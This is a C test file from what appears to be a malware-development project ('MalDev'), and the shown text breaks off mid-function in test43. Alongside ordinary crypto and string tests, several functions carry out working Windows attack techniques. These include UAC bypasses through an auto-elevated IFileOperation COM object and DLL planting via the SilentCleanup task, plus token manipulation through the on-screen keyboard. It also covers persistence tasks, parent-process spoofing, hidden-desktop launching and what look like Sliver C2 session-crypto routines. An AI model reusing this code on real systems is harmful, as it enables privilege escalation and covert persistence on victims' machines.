#include "pch.h"

VOID Callback
(
	_In_ BSTR lpInput,
	_In_ LPVOID Arg
)
{
	LPWSTR lpDllPath = (LPWSTR)Arg;
	LPSTR szFolderName, szTemp;
	CHAR szTempPath[MAX_PATH];

	szFolderName = StrStrA(lpInput, "\tFileName = \"") + lstrlenA("\tFileName = \"");
	szTemp = StrChrA(szFolderName, '"');
	szTemp[0] = '\0';
	GetTempPathA(MAX_PATH, szTempPath);
	lstrcatA(szTempPath, "\\");
	lstrcatA(szTempPath, szFolderName);
	PrintFormatA("szTempPath: %s\n", szTempPath);
	//CopyFileWp(lpDllPath, szTempPath, FALSE);
}

VOID StartTaskThread(VOID)
{
	HANDLE hEvent = NULL;

	while (TRUE) {
		hEvent = OpenEventW(EVENT_ALL_ACCESS, FALSE, L"EventSink");
		if (hEvent != NULL) {
			break;
		}

		Sleep(2000);
	}

	if (!StartTask(L"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup")) {
		return;
	}
}

VOID test1(void) {
	HANDLE hThread = NULL;

	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartTaskThread, NULL, 0, NULL);
	if (hThread == NULL) {
		return;
	}

	RegisterAsyncEvent(L"SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA \"Win32_Directory\" AND TargetInstance.Drive = \"C:\" AND TargetInstance.Path = \"\\\\Users\\\\Admin\\\\AppData\\\\Local\\\\Temp\\\\\" AND TargetInstance.FileName LIKE \"________-____-____-____-____________\"", Callback, L"C:\\Users\\Admin\\Desktop\\LogProvider.dll");
}

VOID test2
(
	_In_ LPWSTR lpDllPath
)
{
	PBYTE pOutput = NULL;
	DWORD dwSize = 0;
	WCHAR wszPath[MAX_PATH] = L"C:\\Users\\Admin\\Desktop\\Test.exe";
	LPSTR szFolderName, szTemp;
	CHAR szTempPath[MAX_PATH];

	if (!CreateProcessAndGetOutput(wszPath, &pOutput, &dwSize)) {
		return;
	}

	szFolderName = StrStrA(pOutput, "\tFileName = \"") + lstrlenA("\tFileName = \"");
	szTemp = StrChrA(szFolderName, '"');
	szTemp[0] = '\0';
	GetTempPathA(MAX_PATH, szTempPath);
	lstrcatA(szTempPath, "\\");
	lstrcatA(szTempPath, szFolderName);
	CopyFileWp(lpDllPath, szTempPath, FALSE);
}

BOOL IsGUIDStringW
(
	_In_ LPWSTR lpInput
)
{
	// 01234567-0123-0123-0123-0123456789ab
	DWORD dwLength = lstrlenW(lpInput);
	UINT32 i, j;
	WCHAR AllowedCharacters[] = { L'a', L'b', L'c', L'd', L'e', L'f', L'A', L'B', L'C', L'D', L'E', L'F' };
	BOOL bIsOk = FALSE;

	if (lpInput[8] != L'-' || lpInput[13] != L'-' || lpInput[18] != L'-' || lpInput[23] != L'-') {
		return FALSE;
	}

	lpInput[8] = L'0';
	lpInput[13] = L'0';
	lpInput[18] = L'0';
	lpInput[23] = L'0';
	for (i = 0; i < dwLength; i++) {
		for (j = 0; j < _countof(AllowedCharacters); j++) {
			if (lpInput[i] == AllowedCharacters[j] || (lpInput[i] >= L'0' && lpInput[i] <= '9')) {
				bIsOk = TRUE;
				break;
			}
		}

		if (!bIsOk) {
			return FALSE;
		}
	}

	lpInput[8] = L'-';
	lpInput[13] = L'-';
	lpInput[18] = L'-';
	lpInput[23] = L'-';
	return TRUE;
}

BOOL PrintFileName(
	_In_ HANDLE hDir,
	_In_ LPWSTR lpPath,
	_In_ LPVOID lpParameters
)
{
	LPWSTR lpFileName = PathFindFileNameW(lpPath);
	LPWSTR lpDirName;
	LPWSTR lpOutput = (LPWSTR)lpParameters;

	if (StrCmpW(lpFileName, L"LogProvider.dll")) {
		return FALSE;
	}

	lpFileName[-1] = L'\0';
	lpDirName = PathFindFileNameW(lpPath);
	if (!IsGUIDStringW(lpDirName)) {
		return FALSE;
	}

	CloseHandle(hDir);
	StrCpyW(lpOutput, lpPath);
}

VOID test3
(
	_In_ LPWSTR lpMaliciousDll
)
{
	WCHAR wszLogProvider[MAX_PATH];
	DWORD dwResult;
	HANDLE hFile = INVALID_HANDLE_VALUE;

	SecureZeroMemory(wszLogProvider, sizeof(wszLogProvider));
	WatchFileCreationEx(L"C:\\Users\\Admin\\AppData\\Local\\Temp", TRUE, PrintFileName, wszLogProvider);
	PrintFormatW(L"%s\n", wszLogProvider);
	if (!IsFolderExist(wszLogProvider)) {
		LogError(L"%s.%d: Folder is not exist\n", __FILE__, __LINE__);
		return;
	}

	StrCatW(wszLogProvider, L"\\LogProvider.dll");
	if (!IsFileExist(wszLogProvider)) {
		LogError(L"%s.%d: File is not exist\n", __FILE__, __LINE__);
		return;
	}

	if (!CopyFileWp(lpMaliciousDll, wszLogProvider, TRUE)) {
		LogError(L"%s.%d: Failed to copy dll\n", __FILE__, __LINE__);
		return;
	}

	PrintFormatW(L"dwResult = 0x%08x\n", dwResult);
	hFile = CreateFileW(wszLogProvider, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		LOG_ERROR("CreateFileW", GetLastError());
		return;
	}

	Sleep(1000000);
}

void test4(void) {
	PrintFormatA("%s\n", ConvertWcharToChar(L"Hello World"));
	PrintFormatW(L"%s\n", ConvertCharToWchar("Hello World"));
}

void test5(void) {
	
}

void test6(void) {

}

void test7(void) {
	CHAR szKey[] = { 231, 121, 89, 214, 23, 251, 49, 23, 236, 76, 192, 5, 20, 135, 151, 126, 176, 103, 181, 0, 131, 195, 5, 20, 64, 243, 54, 65, 45, 46, 151, 150 };
	CHAR szNonce[] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1 };
	PBYTE pCipherText = NULL;
	CHAR szPlainText[] = { 224, 233, 149, 125, 99, 245, 90, 7, 96, 115, 115, 148, 209, 93, 172, 122, 107, 122, 3, 27, 34, 63, 79, 48, 19, 49, 81, 114, 25, 182, 115, 60, 10, 32, 251, 113, 100, 7, 2, 43, 116, 89, 213, 134, 47, 155, 113, 206, 255, 156, 45, 214, 193, 173, 94, 231, 160, 3, 90, 47, 143, 78, 239, 13, 173, 21 };
	LPSTR lpOutput = NULL;
	DWORD cbCipherText = 0;

	Chacha20Poly1305Encrypt(szKey, szNonce, szPlainText, sizeof(szPlainText), NULL, 0, &pCipherText, &cbCipherText);
	lpOutput = ConvertToHexString(pCipherText, cbCipherText);
	PrintFormatA("%s\n", lpOutput);
	FREE(lpOutput);
	//Chacha20Poly1305Decrypt(szKey, szNonce, szCipherText, szPlainText, lstrlenA("test"));
}

void test8(void) {
	BYTE Buffer[] = { 152, 160, 197, 161, 181, 205, 97, 250, 161, 153 };
	LPSTR lpHexString = NULL;
	PBYTE pByteArray = NULL;
	lpHexString = ConvertToHexString(Buffer, _countof(Buffer));
	PrintFormatA("lpHexString = %s\n", lpHexString);
	pByteArray = FromHexString(lpHexString);
	for (DWORD i = 0; i < _countof(Buffer); i++) {
		if (Buffer[i] != pByteArray[i]) {
			PrintFormatA("Failed at %d\n", i);
			break;
		}
	}

	FREE(lpHexString);
	FREE(pByteArray);
}

void test9(void) {
	PBYTE pHashDigest = ComputeSHA256("Hello World", lstrlenA("Hello World"));
	LPSTR lpHexDigest = ConvertToHexString(pHashDigest, 32);
	PrintFormatA("Hex digest: %s\n", lpHexDigest);
	FREE(pHashDigest);
	FREE(lpHexDigest);
	return;
}

void test10(void) {
	LPSTR lpOutput = NULL;
	PBYTE HMac = GenerateHmacSHA256("Secret Key", lstrlenA("Secret Key"), "Hello World", lstrlenA("Hello World"));
	lpOutput = ConvertToHexString(HMac, 32);
	PrintFormatA("lpOutput: %s\n", lpOutput);
	FREE(HMac);
	return;
}

void test11(void) {
	CHAR szInput[] = "age1c6j0mssdmznty6ahkckmhwszhd3lquupd5rqxnzlucma482yvspsengc59";
	PBYTE pOutput;
	DWORD cbOutput = 0;
	CHAR szHrp[0x20];
	LPSTR lpOutput = NULL;

	RtlSecureZeroMemory(szHrp, sizeof(szHrp));
	Bech32Decode(szHrp, &pOutput, &cbOutput, szInput);
	lpOutput = ConvertToHexString(pOutput, cbOutput);
	PrintFormatA("szOutput: %s\n", lpOutput);
	return;
}

void test12(void) {
	BYTE a[] = { 0x4c, 0x4a, 0x3a, 0x8a, 0xa4, 0xc, 0xa7, 0xe9, 0xc8, 0x50, 0xf9, 0x2e, 0x3c, 0x5b, 0xa3, 0x2, 0x21, 0xc0, 0x4a, 0x6a, 0xe3, 0x3e, 0xb6, 0xc0, 0x26, 0x5f, 0xb2, 0xb9, 0xc4, 0xf0, 0x92, 0xa7 };
	BYTE b[] = { 0x9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0 };
	BYTE c[0x20] = { 0 };
	ComputeX25519(c, a, b);
	LPSTR lpOutput = ConvertToHexString(c, sizeof(c));
	PrintFormatA("lpOutput: %s\n", lpOutput);
	FREE(lpOutput);
}

void test13(void) {
	CHAR szInfo[] = "hkdf-example";
	CHAR szKey[] = "input key";
	BYTE Salt[] = { 188, 49, 67, 71, 174, 231, 83, 62, 183, 47, 136, 245, 54, 178, 101, 135, 50, 72, 41, 97, 103, 184, 5, 86, 223, 122, 35, 123, 76, 235, 87, 30 };
	PBYTE pOutput = NULL;
	LPSTR lpOutput = NULL;

	pOutput = HKDFGenerate(Salt, sizeof(Salt), szKey, lstrlenA(szKey), NULL, 0, 41);
	lpOutput = ConvertToHexString(pOutput, 41);
	PrintFormatA("lpOutput: %s\n", lpOutput);
	FREE(lpOutput);
	FREE(pOutput);
	return;
}

void test14(void) {
	BYTE FileKey[] = { 0xca, 0x98, 0xb5, 0xff, 0x69, 0xc9, 0x5a, 0xb7, 0x19, 0x67, 0xc6, 0xe4, 0x33, 0x5c, 0x68, 0xf5 };
	BYTE TheirPubKey[] = { 0xdd, 0x55, 0x44, 0xfc, 0xae, 0xae, 0x32, 0xea, 0xd, 0x6, 0x2e, 0x7b, 0x13, 0x46, 0xca, 0x53, 0xb5, 0xde, 0xc, 0x53, 0x2e, 0x8c, 0x6, 0xbd, 0xbc, 0x58, 0x9e, 0x6e, 0xa9, 0xa7, 0x8d, 0x61 };
	PSTANZA pResult = NULL;
	LPSTR lpOutput = NULL;

	pResult = AgeRecipientWrap(FileKey, sizeof(FileKey), TheirPubKey);
	lpOutput = ConvertToHexString(pResult->pBody, 32);
	PrintFormatA("lpOutput: %s\n", lpOutput);
	FREE(lpOutput);
	FREE(pResult);
}

void test15(void) {
	CHAR szRecipientPubKey[] = "age103wh7xqpzhd3m3qmjf69z57equeecl057y0nh5fgfdr3np455c0qknjum8";
	BYTE PlainText[] = { 10, 32, 160, 8, 226, 25, 133, 57, 45, 26, 159, 50, 208, 44, 0, 207, 249, 243, 54, 158, 66, 199, 50, 184, 3, 16, 128, 176, 16, 14, 190, 185, 202, 227 };
	DWORD cbOutput = 0;
	PBYTE pCipherText = NULL;

	pCipherText = AgeEncrypt(szRecipientPubKey, PlainText, sizeof(PlainText), &cbOutput);
	HexDump(pCipherText, 266);
	FREE(pCipherText);
}

void test16(void) {
	MessageBoxW(NULL, L"Hello World", L"Title", MB_OK);
}

void test17(void) {
	CHAR wszInput[] = "As before, a side effect of this design is that when a function returns the same value as one of its callees, it needs to read the return value from the callee from its own activation record, then place it back onto the stack at a return value in its caller’s activation record. Tail call optimizations (TCO) thus remain impossible.";
	LPSTR lpOutput = NULL;

	lpOutput = StrReplaceA(wszInput, "a", "bbbbbbbbb", TRUE, 0);
	PrintFormatA("%s\n", wszInput);
	PrintFormatA("-----------------------------\n");
	PrintFormatA("%s\n", lpOutput);
	FREE(lpOutput);
}

void test18(void) {
	LPSTR lpOutput = GenGUIDStrA();
	PrintFormatA("%s\n", lpOutput);
	FREE(lpOutput);
}

void test19(void) {
	WTStartPersistence("C:\\Users\\Admin\\source\\repos\\MalDev\\x64\\Debug\\Test.exe");
	return;
}

void test20(void) {
	LPWSTR* pArray = NULL;
	DWORD dwSize = 0;

	pArray = ListFileWithFilter(L"C:\\Users\\Admin\\Desktop\\Apps", L"*T*", 0, &dwSize);
	if (pArray != NULL && dwSize > 0) {
		for (DWORD i = 0; i < dwSize; i++) {
			PrintFormatW(L"%d: %s\n", pArray[i]);
		}
	}
}

void test21
(
	_In_ LPSTR lpCommandLine
)
{
	HANDLE hProc = NULL;
	HANDLE hToken = NULL;
	DWORD dwPid = 0;
	SECURITY_ATTRIBUTES sa;
	HANDLE hDuplicatedToken = NULL;
	TOKEN_MANDATORY_LABEL TokenInfo;
	PSID pSid = NULL;
	LPWSTR lpTempPath = NULL;
	CHAR szVbsContent[] = "Set troll = WScript.CreateObject(\"WScript.Shell\")\ntroll.Run \"taskmgr.exe\"\nWScript.Sleep 250\ntroll.SendKeys \"%\"\nWScript.Sleep 250\ntroll.SendKeys \"{F}\"\nWScript.Sleep 250\ntroll.SendKeys \"{ENTER}\"\nWScript.Sleep 250\ntroll.SendKeys \"^v\"\ntroll.SendKeys \"{TAB}\"\nWScript.Sleep 250\ntroll.SendKeys \"{+}\"\nWScript.Sleep 250\ntroll.SendKeys \"{ENTER}\"\nWScript.Sleep 250\ntroll.AppActivate(\"Task Manager\")\ntroll.SendKeys \"%{f4}\"";
	LPWSTR lpCscriptCommandLine = NULL;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	HGLOBAL hMem = NULL;
	LPWSTR lpGlobalMem = NULL;
	LPWSTR lpTemp = NULL;

	SHELLEXECUTEINFOW sei = { sizeof(sei) };
	sei.lpVerb = L"open";
	sei.lpFile = L"osk.exe";
	sei.nShow = SW_SHOW;
	sei.fMask |= SEE_MASK_NOCLOSEPROCESS;

	if (!ShellExecuteExW(&sei)) {
		LOG_ERROR("ShellExecuteExW", GetLastError());
		goto CLEANUP;
	}

	dwPid = GetProcessId(sei.hProcess);
	CloseHandle(sei.hProcess);
	PrintFormatW(L"dwPid = %d\n", dwPid);
	hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_TERMINATE, TRUE, dwPid);
	if (hProc == NULL) {
		LOG_ERROR("OpenProcess", GetLastError());
		goto CLEANUP;
	}

	if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
		LOG_ERROR("OpenProcessToken", GetLastError());
		goto CLEANUP;
	}

	RtlSecureZeroMemory(&sa, sizeof(sa));
	if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, &sa, SecurityImpersonation, TokenPrimary, &hDuplicatedToken)) {
		LOG_ERROR("DuplicateTokenEx", GetLastError());
		goto CLEANUP;
	}

	RtlSecureZeroMemory(&TokenInfo, sizeof(TokenInfo));
	ConvertStringSidToSidW(SDDL_ML_MEDIUM, &pSid);
	TokenInfo.Label.Sid = pSid;
	if (!SetTokenInformation(hDuplicatedToken, TokenIntegrityLevel, &TokenInfo, sizeof(TokenInfo))) {
		LOG_ERROR("SetTokenInformation", GetLastError());
		goto CLEANUP;
	}

	if (!WriteToTempPath(szVbsContent, lstrlenA(szVbsContent), L"vbs", &lpTempPath)) {
		goto CLEANUP;
	}

	hMem = GlobalAlloc(GMEM_MOVEABLE, (lstrlenA(lpCommandLine) + 1) * sizeof(WCHAR));
	if (hMem == NULL) {
		LOG_ERROR("GlobalAlloc", GetLastError());
		goto CLEANUP;
	}

	lpGlobalMem = GlobalLock(hMem);
	lpTemp = ConvertCharToWchar(lpCommandLine);
	lstrcpyW(lpGlobalMem, lpTemp);
	lpGlobalMem[lstrlenW(lpGlobalMem)] = L'\0';
	GlobalUnlock(hMem);
	if (!OpenClipboard(NULL)) {
		LOG_ERROR("OpenClipboard", GetLastError());
		goto CLEANUP;
	}

	if (!EmptyClipboard()) {
		LOG_ERROR("EmptyClipboard", GetLastError());
		goto CLEANUP;
	}

	if (!SetClipboardData(CF_UNICODETEXT, hMem)) {
		LOG_ERROR("SetClipboardData", GetLastError());
		goto CLEANUP;
	}

	CloseClipboard();
	lpCscriptCommandLine = ALLOC((lstrlenW(lpTempPath) + 21) * sizeof(WCHAR));
	lstrcpyW(lpCscriptCommandLine, L"cscript.exe /NOLOGO ");
	lstrcatW(lpCscriptCommandLine, lpTempPath);
	RtlSecureZeroMemory(&si, sizeof(si));
	RtlSecureZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	if (!CreateProcessAsUserW(hDuplicatedToken, NULL, lpCscriptCommandLine, &sa, &sa, FALSE, 0, NULL, NULL, &si, &pi)) {
		LOG_ERROR("CreateProcessAsUserW", GetLastError());
		goto CLEANUP;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);
	DeleteFileW(lpTempPath);
	TerminateProcess(hProc, 0);
CLEANUP:
	if (lpTemp != NULL) {
		FREE(lpTemp);
	}

	if (hMem != NULL) {
		GlobalFree(hMem);
	}

	if (pi.hThread != NULL) {
		CloseHandle(pi.hThread);
	}

	if (pi.hProcess != NULL) {
		CloseHandle(pi.hProcess);
	}
	return;
}

void test22(void) {
	for (DWORD i = 0; i < 1000; i++) {
		PrintFormatW(L"#%d: ", i);
		IsSystemLock();
		Sleep(1000);
	}
}

void test23(void) {
	BypassByOsk("cmd /C \"cd C:\\Users\\Admin\\Desktop && whoami /priv > a.txt\"");
}

void test24(void) {
	WCHAR wszCommandLine[] = L"D:\\Documents\\source\\repos\\MalDev\\x64\\Debug\\1Test.exe";
	CreateProcessWithDesktop(wszCommandLine, L"Hidden Desktop");
}

void test25(void) {
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	RtlSecureZeroMemory(&si, sizeof(si));
	RtlSecureZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	si.dwFlags |= STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	if (!CreateProcessW(L"C:\\Windows\\System32\\osk.exe", L"C:\\Windows\\System32\\osk.exe ", NULL, NULL, FALSE, CREATE_DEFAULT_ERROR_MODE | CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
		LOG_ERROR("CreateProcessW", GetLastError());
	}

	if (pi.hThread != NULL) {
		CloseHandle(pi.hThread);
	}

	if (pi.hProcess != NULL) {
		CloseHandle(pi.hProcess);
	}
}

void test26(void) {
	SIZE_T cbList = 0;
	PPROC_THREAD_ATTRIBUTE_LIST pAttrList = NULL;

	InitializeProcThreadAttributeList(NULL, 8, 0, &cbList);
	HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, 27644);
	pAttrList = ALLOC(cbList);
	if (!InitializeProcThreadAttributeList(pAttrList, 8, 0, &cbList)) {
		LOG_ERROR("InitializeProcThreadAttributeList", GetLastError());
		return;
	}

	if (!UpdateProcThreadAttribute(pAttrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(hParent), NULL, NULL)) {
		LOG_ERROR("UpdateProcThreadAttribute", GetLastError());
		return;
	}
}

void test27(void) {
	LogError(L"Hello World");
}

void test28(void) {
	MasqueradedMoveCopyDirectoryFileCOM(L"C:\\Users\\Admin\\Desktop\\a.txt", L"C:\\Windows\\System32", FALSE);
}

void test29(void)
{
	BOOL                cond = FALSE;
	IFileOperation* FileOperation1 = NULL;
	IShellItem* isrc = NULL, * idst = NULL;
	BIND_OPTS3          bop;
	SHELLEXECUTEINFOW   shexec;
	HRESULT             r;

	do {

		r = CoInitialize(NULL);
		if (r != S_OK)
			break;

		RtlSecureZeroMemory(&bop, sizeof(bop));
		RtlSecureZeroMemory(&shexec, sizeof(shexec));

		r = CoCreateInstance(&CLSID_FileOperation, NULL,
			CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER, &IID_IFileOperation, &FileOperation1);

		if (r != S_OK) {
			break;
		}

		if (FileOperation1 != NULL) {
			FileOperation1->lpVtbl->Release(FileOperation1);
		}

		bop.cbStruct = sizeof(bop);
		bop.dwClassContext = CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER/* | CLSCTX_INPROC_HANDLER*/;
		r = CoGetObject(L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}", (BIND_OPTS*)&bop, &IID_IFileOperation, &FileOperation1);
		if (r != S_OK) {
			break;
		}
		if (FileOperation1 == NULL) {
			r = E_FAIL;
			break;
		}

		FileOperation1->lpVtbl->SetOperationFlags(FileOperation1,
			FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION);

		r = SHCreateItemFromParsingName(L"C:\\temp\\ntwdblib.dll",
			NULL, &IID_IShellItem, &isrc);

		if (r != S_OK) {
			break;
		}
		r = SHCreateItemFromParsingName(L"C:\\windows\\system32\\", NULL, &IID_IShellItem, &idst);
		if (r != S_OK) {
			break;
		}

		r = FileOperation1->lpVtbl->MoveItem(FileOperation1, isrc, idst, NULL, NULL);
		if (r != S_OK) {
			break;
		}
		r = FileOperation1->lpVtbl->PerformOperations(FileOperation1);
		if (r != S_OK) {
			break;
		}

		idst->lpVtbl->Release(idst);
		idst = NULL;
		isrc->lpVtbl->Release(isrc);
		isrc = NULL;

		shexec.cbSize = sizeof(shexec);
		shexec.fMask = SEE_MASK_NOCLOSEPROCESS;
		shexec.nShow = SW_SHOW;

		shexec.lpFile = L"C:\\windows\\system32\\cliconfg.exe";
		shexec.lpParameters = NULL;
		shexec.lpDirectory = L"C:\\windows\\system32\\";
		if (ShellExecuteExW(&shexec)) {
			if (shexec.hProcess != NULL) {
				WaitForSingleObject(shexec.hProcess, INFINITE);
				CloseHandle(shexec.hProcess);
			}
		}

	} while (cond);

	if (FileOperation1 != NULL) {
		FileOperation1->lpVtbl->Release(FileOperation1);
	}
	if (isrc != NULL) {
		isrc->lpVtbl->Release(isrc);
	}
	if (idst != NULL) {
		idst->lpVtbl->Release(idst);
	}
	CoUninitialize();
}

void test30(void) {
	PBYTE pBuffer = NULL;
	DWORD cbBuffer = 0;

	pBuffer = ReadFromFile(L"C:\\Windows\\System32\\cmd.exe", &cbBuffer);
	IeAddOnInstallMethod(pBuffer, cbBuffer);
	FREE(pBuffer);
}

void test31(void) {
	LPWSTR List[] = { L"Zalo.exe", L"SystemInformer.exe", L"chrome.exe", L"steam.exe", L"wallpaper32.exe", L"SnippingTool.exe" };
	BOOL Result = FALSE;

	Result = AreProcessesRunning(List, _countof(List), 0);
	PrintFormatW(L"Result = %d\n", Result);
}

void test32(void) {
	CreateAtLogonTask(L"Calc", L"C:\\Windows\\System32\\calc.exe");
}

void test33(void) {
	MasqueradedMoveCopyDirectoryFileCOM(L"C:\\Users\\Admin\\Desktop\\ida.hexli", L"C:\\Windows\\System32", FALSE);
}

void test34(void) {
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	RtlSecureZeroMemory(&si, sizeof(si));
	RtlSecureZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}

void test35(void) {
	CHAR szRecipientPubKey[] = "age103wh7xqpzhd3m3qmjf69z57equeecl057y0nh5fgfdr3np455c0qknjum8";
	BYTE PrivateKey[] = "AGE-SECRET-KEY-1H8ACTYAEN9TN8XM4FNJR0KLAFR0FDMAQ8NTJTLKU3JZA6TWR7QSQ206NN8";
	BYTE PublicKey[] = "age1e983tu02e4ht5m5s3kdc8gcddpqs8jvkdft4644e80ngnh3rrvvqw06pk2";
	PBYTE pCipherText = NULL;
	DWORD cbCipherText = 0;
	BYTE PlainText[] = { 10, 32, 207, 232, 22, 198, 58, 9, 197, 243, 173, 16, 93, 130, 177, 56, 205, 148, 33, 17, 156, 162, 199, 197, 246, 217, 49, 150, 20, 146, 123, 199, 136, 248 };

	pCipherText = AgeKeyExToServer(szRecipientPubKey, PrivateKey, PublicKey, PlainText, _countof(PlainText), &cbCipherText);
	HexDump(pCipherText, cbCipherText);
	FREE(pCipherText);
}

void test36(void) {
	/*CHAR szEncodedStr[] = "SGVsbG8gV29ybGQ=";
	DWORD cbOutput = 0;
	LPSTR lpOutput = NULL;

	lpOutput = Base64Decode(szEncodedStr, &cbOutput);
	PrintFormatA("lpOutput: %s, cbOutput: %d\n", lpOutput, cbOutput);
	FREE(lpOutput);*/
}

void test37(void) {
	BYTE CipherText[] = { 69, 100, 241, 205, 130, 19, 84, 64, 192, 139, 144, 144, 76, 102, 126, 178, 220, 49, 255, 50, 134, 6, 178, 19, 111, 101, 235, 109, 142, 220, 80, 109, 83, 183, 239, 211, 11, 38, 88, 81, 137, 198, 77, 175, 46, 180, 204, 247, 145, 70, 196, 223, 12, 79, 33, 202, 34, 241, 49, 43, 148, 167, 117, 64, 16, 81, 209, 90, 0, 122, 22, 15, 152, 4, 231, 162, 192, 64, 243, 108, 238, 189, 23, 193, 98, 223, 142, 236, 212, 44, 235, 226, 231, 187, 60, 154, 189, 50, 249, 188, 89, 56, 43, 67, 65, 253, 119, 243, 213, 25, 193, 238, 178, 173, 183, 205, 29, 36, 124, 149, 53, 236, 5, 153, 56, 160, 183, 249, 239, 241, 147, 240, 71, 202, 142, 114, 243, 109, 6, 173, 198, 119, 218, 123, 240, 242, 190, 91, 186, 14, 18, 149, 249, 58, 12, 16, 119, 211 };
	LPSTR lpOutput = NULL;

	//lpOutput = SliverBase64Encode(CipherText, _countof(CipherText));
	PrintFormatA("%s\n", lpOutput);
	FREE(lpOutput);
}

void test38(void) {
	/*CHAR szEncoded[] = "osqOP-fq_c2a3+bnqduYKLNOZPhd0Jfqw8tJw-VxrdRqLYZqb9u-r-FdqvWMLjPS4rwcSNOmfxG3WqcJDhyRn00oQ_GazB-mEaqFGK0aW8PM7oA0-LYlVknKUYiFMP9v7qi+754ThQk0ZtAPRoF0VJhLLWQy6e9_kzN5Eq31LZF7WumNoWIlx7kL0ISdyXHVWmhYsVGlcHt+l1NnyXj";
	DWORD cbOutput = 0;
	PBYTE pOutput = NULL;

	pOutput = SliverBase64Decode(szEncoded, &cbOutput);
	HexDump(pOutput, cbOutput);
	FREE(pOutput);*/
}

void test39(void) {
	/*BYTE Msg[] = { 69, 100, 241, 205, 130, 19, 84, 64, 192, 139, 112, 170, 174, 238, 194, 80, 174, 195, 105, 64, 246, 2, 239, 184, 35, 205, 42, 85, 150, 16, 225, 147, 228, 17, 249, 8, 118, 174, 211, 177, 206, 159, 245, 113, 219, 53, 45, 186, 203, 94, 182, 76, 5, 77, 176, 249, 35, 22, 67, 237, 95, 71, 186, 35, 204, 13, 153, 248, 66, 4, 39, 6, 162, 3, 218, 1, 175, 173, 130, 127, 18, 224, 155, 253, 10, 118, 58, 148, 82, 75, 107, 121, 234, 27, 1, 162, 86, 123, 42, 86, 137, 119, 235, 218, 226, 89, 159, 36, 134, 161, 199, 18, 63, 48, 84, 251, 126, 144, 111, 105, 252, 50, 71, 3, 180, 224, 167, 23, 175, 99, 229, 48, 200, 185, 145, 130, 91, 25, 33, 98, 52, 247, 201, 120, 221, 199, 41, 247, 222, 191, 90, 65, 87, 50, 18, 145, 56, 106, 208, 228 };
	CHAR szServerMinisignPublicKey[] = "untrusted comment: minisign public key: 8BC040541382CDF1\nRWTxzYITVEDAi0WSY4oCDg/kTkSnjDCcsPuXF4xm/kyh434uy6PHFiUq";
	SessionDecrypt(NULL, Msg, _countof(Msg), szServerMinisignPublicKey, NULL);;*/
}

void test40(void) {
	CHAR wszInput[] = "aaaaaaNewaaaa to ubuntu and servers. I just finished installing a new ubuntu server and added LAMP. I can assess the webpage that I am hosting by typing in the web browser the IP address of the server. what I would like to know is how to access the same web page locally on my network from another computer using a name instead of the IP address.aaa";
	LPSTR* pResult = NULL;
	DWORD cbResult = 0;
	DWORD i = 0;

	pResult = StrSplitNA(wszInput, "a", 0, &cbResult);
	PrintFormatA("cbResult = %d\n", cbResult);
	for (i = 0; i < cbResult; i++) {
		PrintFormatA("%s\n", pResult[i]);
	}
}

void test41(void) {
	CHAR szInpit[] = "untrusted comment: minisign public key: C974C3DEE0AE9DF4\nRWT0na7g3sN0yad3zBthDFTfPuEnuG+wDeLQesyaBb3nTCIVsBg+PXAv";
	PMINISIGN_PUB_KEY pResult = NULL;
	pResult = DecodeMinisignPublicKey(szInpit);
	HexDump(pResult, sizeof(MINISIGN_PUB_KEY));
	FREE(pResult);
}

void test42(void) {
	BYTE Data[] = "GeeksForGeeks";
	PBYTE pDigest = NULL;

	pDigest = Blake2B(Data, lstrlenA(Data), NULL, 0);
	HexDump(pDigest, 64);
	FREE(pDigest);
}

//#include "D:\\Temp\\ed25519\\src\\ed25519.h"
//#include "D:\\Temp\\ed25519\\src\\ge.h"
//#include "D:\\Temp\\ed25519\\src\\sc.h"
typedef int (WINAPI* ED25519_VERIFY)(PBYTE, PBYTE, SIZE_T, PBYTE);

void test43(void) {
	BYTE Msg[] = { 218, 1, 175, 173, 130, 127, 18, 224, 155, 253, 10, 118, 58, 148, 82, 75, 107, 121, 234, 27, 1, 162, 86, 123, 42, 86, 137, 119, 235, 218, 226, 89, 159, 36, 134, 161, 199, 18, 63, 48, 84, 251, 126, 144, 111, 105, 252, 50, 71, 3, 180, 224, 167, 23, 175, 99, 229, 48, 200, 185, 145, 130, 91, 25, 33, 98, 52, 247, 201, 120, 221, 199, 41, 247, 222, 191, 90, 65, 87, 50, 18, 145, 56, 106, 208, 228 };
